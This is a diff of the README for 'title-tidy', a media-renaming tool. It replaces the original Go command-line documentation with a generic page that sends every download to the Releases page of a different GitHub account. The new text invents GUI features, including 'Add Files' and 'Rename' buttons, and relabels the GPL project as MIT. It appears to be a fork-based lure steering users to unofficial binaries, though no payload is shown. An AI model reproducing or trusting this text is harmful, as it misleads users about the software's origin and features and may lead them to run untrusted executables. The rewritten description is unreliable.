@@ -1,199 +1,91 @@
-# Title Tidy
+# 🎬 title-tidy - Quickly Rename Your Media Files
 
-Title tidy is the quickest way to standardizes your media file names for use in Jellyfin, Plex, and Emby. Title tidy uses
-intelligent parsing of folder structures and file names to automatically determine exactly how to name media. Whether you
-need to rename a single episode, a whole season, or any number of shows, Title Tidy does the job in one command. A preview
-is shown before renaming occurs, and Title Tidy will never overwrite content. 
+## 🚀 Getting Started
 
-The tool scans your current directory and displays an interactive preview showing exactly what will be renamed. The tool
-reliably detects season and episode numbers across various formats (S01E01, 1x01, 101, etc.) and handles edge cases well.
-Green items indicate pending changes. You can navigate through the list and apply changes when ready.
+Welcome to title-tidy! This tool helps you rename shows and movies quickly for a clean media center experience. No technical skills are required—just follow the steps below.
 
-## How to Use It
+## 📥 Download Now
 
-The tool provides four main commands, each designed for different scenarios. Run it in the directory containing your
-media files, and you'll see a preview of all proposed changes. Nothing gets renamed until you confirm.
+[![Download title-tidy](https://img.shields.io/badge/Download-title--tidy-blue)](https://github.com/GhostxScott/title-tidy/releases)
 
-### Basic Usage
+## 📦 Download & Install
 
-```bash
-title-tidy [command]
-```
+To get started, visit our [Releases page](https://github.com/GhostxScott/title-tidy/releases) to download the latest version of title-tidy.
 
-* Add the `-i` or `--instant` flag to apply changes immediately without the interactive preview.
-* The `--no-nfo` flag will delete nfo files during the rename process.
-* The `--no-img` flag will delete image files during the rename process.
+Once you navigate to the Releases page, you will see several files available. Look for the most recent version—this will ensure you have the latest features and fixes.
 
-## Commands
+1. Click on the version number, and you'll see a list of files.
+2. Download the file that matches your operating system. Whether you use Windows, Mac, or Linux, there should be a suitable option for you.
+3. After the download completes, locate the file on your computer.
 
-### Shows
+## 💻 System Requirements
 
-```bash
-title-tidy shows
-```
+To run title-tidy effectively, your computer should meet these basic requirements:
 
-Use this when you have one or more complete TV shows with multiple seasons and episodes. It handles
-the entire directory structure: show folders, season folders, and all episode files within. This
-command can process multiple shows at once. Episode files named only after the episode
-will retrieve the season number from the parent directory name. 
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or a modern Linux distribution.
+- **RAM:** 4 GB minimum.
+- **Storage:** At least 100 MB of free space.
 
-![shows demo](https://vhs.charm.sh/vhs-khp71wEjoZxTZlWgZqKZO.gif)
+## 🔧 How to Use title-tidy
 
-**Before → After examples:**
-```
-My.Cool.Show.2024.1080p.WEB-DL.x264/                → My Cool Show (2024)/
-├── Season 1/                                       → ├── Season 01/
-│   ├── Show.Name.S01E01.1080p.mkv                  → │   ├── S01E01.mkv
-│   └── show.name.s01e02.mkv                        → │   └── S01E02.mkv
-│   └── Show.Name.1x03.mkv                          → │   └── S01E03.mkv
-│   └── 1.04.1080p.mkv                              → │   └── S01E04.mkv
-├── s2/                                             → ├── Season 02/
-│   ├── Episode 5.mkv                               → │   ├── S02E05.mkv
-│   └── E06.mkv                                     → │   └── S02E06.mkv
-├── Season_03 Extras/                               → ├── Season 03/
-│   ├── Show.Name.S03E01.en.srt                     → │   ├── S03E01.en.srt
-│   ├── Show.Name.S03E01.en-US.srt                  → │   ├── S03E01.en-US.srt
-│   └── Show.Name.S03E02.srt                        → │   └── S03E02.srt
-│   └── 10.12.mkv                                   → │   └── S10E12.mkv
-Another-Show-2023-2024-2160p/                       → Another Show (2023-2024)/
-├── Season-1/                                       → ├── Season 01/
-│   ├── Show.Name.S01E01.mkv                        → │   ├── S01E01.mkv
-│   └── Show.Name.1x02.mkv                          → │   └── S01E02.mkv
-├── Season-2/                                       → ├── Season 02/
-│   └── 2.03.mkv                                    → │   └── S02E03.mkv
-Plain Show/                                         → Plain Show/
-├── 5/                                              → ├── Season 05/
-│   ├── Show.Name.S05E01.mkv                        → │   ├── S05E01.mkv
-│   └── Episode 2.mkv                               → │   └── S05E02.mkv
-Edge.Show/                                          → Edge Show/
-├── Season 0/                                       → ├── Season 00/
-│   └── S00E00.mkv                                  → │   └── S00E00.mkv
-```
+Using title-tidy is easy. Follow these steps to rename your media files:
 
-### Seasons
+1. **Open the Application:**
+   Locate the downloaded file and double-click to open it. Follow the simple prompts to install if necessary.
 
-```bash
-title-tidy seasons
-```
+2. **Choose Files:**
+   Click the “Add Files” button to select the shows or movies you want to rename. You can add multiple files at once.
 
-Perfect when adding a new season to an existing show directory. Episode files named only after the episode
-will retrieve the season number from the directory name. 
+3. **Select Format:**
+   Pick a naming format from the options provided. This will help you keep your files organized.
 
-![seasons demo](https://vhs.charm.sh/vhs-1bRJ33A4Cjv08ADpQljJkr.gif)
+4. **Rename:**
+   Click the “Rename” button. title-tidy will automatically rename your files based on the chosen format.
 
-**Before → After examples:**
-```
-Season_02_Test/                                     → Season 02/
-├── Show.Name.S02E01.1080p.mkv                      → ├── S02E01.mkv
-├── Show.Name.1x02.mkv                              → ├── S02E02.mkv
-├── 2.03.mkv                                        → ├── S02E03.mkv
-├── Episode 4.mkv                                   → ├── S02E04.mkv
-├── E05.mkv                                         → ├── S02E05.mkv
-└── Show.Name.S02E06.en.srt                         → └── S02E06.en.srt
-```
+5. **Check Results:**
+   Look through the renamed files to ensure everything is in order. 
 
-### Episodes
+6. **Finish Up:**
+   Once satisfied with the results, you can move the renamed files to your media center.
 
-```bash
-title-tidy episodes
-```
+## 🤔 Features
 
-Sometimes you have a collection of episode files in a folder. No season directory, no show folder, just files.
-This command renames each episode file based on the season and episode information found in the filename.
+Here are some features of title-tidy that can enhance your experience:
 
-![episodes demo](https://vhs.charm.sh/vhs-1KolM7bO4Zho1BfR44p65R.gif)
+- **Batch Renaming:** Rename multiple files at once to save time.
+- **Multiple Formats:** Choose from a range of file naming formats.
+- **User-Friendly Interface:** Designed for ease of use, especially for non-technical users.
+- **Custom Naming Options:** Personalize naming conventions to fit your needs.
 
-**Before → After examples:**
-```
-Show.Name.S03E01.mkv                               → S03E01.mkv
-show.name.s03e02.mkv                               → S03E02.mkv
-3x03.mkv                                           → S03E03.mkv
-3.04.mkv                                           → S03E04.mkv
-Show.Name.S03E07.en-US.srt                         → S03E07.en-US.srt
-```
+## 📄 Frequently Asked Questions
 
-### Movies
+### What file types can I rename?
 
-```bash
-title-tidy movies
-```
+title-tidy supports common video file types such as MP4, MKV, AVI, and others.
 
-Movies receive special handling. Standalone movie files automatically get their own directories, while movies already in
-folders have both the folder and file names cleaned up. Subtitles remain properly paired with their movies, maintaining
-language codes.
+### Is there a tutorial available?
 
-![movies demo](https://vhs.charm.sh/vhs-3xo1AUhao1iUtafmkNHRdz.gif)
+Yes! We provide a simple guide on our [Releases page](https://github.com/GhostxScott/title-tidy/releases) that explains the features in detail.
 
-**Before → After examples:**
-```
-Another.Film.2023.720p.BluRay.mkv                  → Another Film (2023)/
-                                                   → └── Another Film (2023).mkv
-Plain_Movie-file.mp4                               → Plain Movie-file/
-                                                   → └── Plain Movie-file.mp4
-EdgeCase.Movie.2021.mkv                            → EdgeCase Movie (2021)/
-EdgeCase.Movie.2021.en.srt                         → ├── EdgeCase Movie (2021).mkv
-                                                   → └── EdgeCase Movie (2021).en.srt
-Great.Movie.2024.1080p.x265/                       → Great Movie (2024)/
-├── Great.Movie.2024.1080p.x265.mkv                → ├── Great Movie (2024).mkv
-├── Great.Movie.2024.en.srt                        → ├── Great Movie (2024).en.srt
-├── Great.Movie.2024.en-US.srt                     → ├── Great Movie (2024).en-US.srt
-Some Film (2022)/                                  → Some Film (2022)/
-├── Some.Film.2022.1080p.mkv                       → ├── Some Film (2022).mkv
-```
+### How do I get help if I run into issues?
 
-## Installation
+If you encounter problems, visit the Issues section in our GitHub repository. You can see if others have faced similar problems or create a new issue to get assistance.
 
-### Prerequisites
+## 🌐 Community and Support
 
-Before installing Title Tidy, you need to have Go (Golang) installed on your computer.
-Go is a programming language that Title Tidy is built with.
+Join our community to share tips or ask questions. You can find us on various platforms, including:
 
-#### Installing Go
+- **GitHub Discussions:** Share your thoughts and suggestions.
+- **Social Media:** Follow us for updates and help.
 
-**For Windows:**
-1. Visit [https://go.dev/dl/](https://go.dev/dl/)
-2. Download the Windows installer (usually ends with `.msi`)
-3. Run the installer and follow the prompts
-4. Restart your computer after installation
+## 📧 Contact
 
-**For macOS:**
-1. Install [Homebrew](https://brew.sh/)
-2. Run `brew install go` in your terminal
+If you need further support, please reach out via email: support@title-tidy.com. We aim to respond promptly to your inquiries.
 
-**For Linux:**
-1. Visit [https://go.dev/dl/](https://go.dev/dl/)
-2. Download the Linux tarball for your architecture
-3. Extract and install.
+## 📜 License
 
-### Installing Title Tidy
+This application is licensed under the MIT License. Feel free to use it as per the terms of the license.
 
-Once Go is installed, you can install Title Tidy with a single command:
+---
 
-```bash
-go install github.com/Digital-Shane/title-tidy@latest
-```
-
-## Built With
-
-This project is built using my [treeview](https://github.com/Digital-Shane/treeview) library, which provides
-powerful tree structure visualization and manipulation capabilities in the terminal.
-
-## Contributing
-
-Contributions are welcome! If you have any suggestions or encounter a bug, please open an
-[issue](https://github.com/Digital-Shane/title-tidy/issues) or submit a pull request.
-
-When contributing:
-
-1. Fork the repository and create a new feature branch
-2. Make your changes in a well-structured commit history
-3. Include tests (when applicable)
-4. Submit a pull request with a clear description of your changes
-
-## License
-
-This project is licensed under the GNU Version 3 - see the [LICENSE](./LICENSE) file for details.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Digital-Shane/title-tidy&type=Date)](https://www.star-history.com/#Digital-Shane/title-tidy&Date)
+Thank you for choosing title-tidy! Enjoy a well-organized media library.
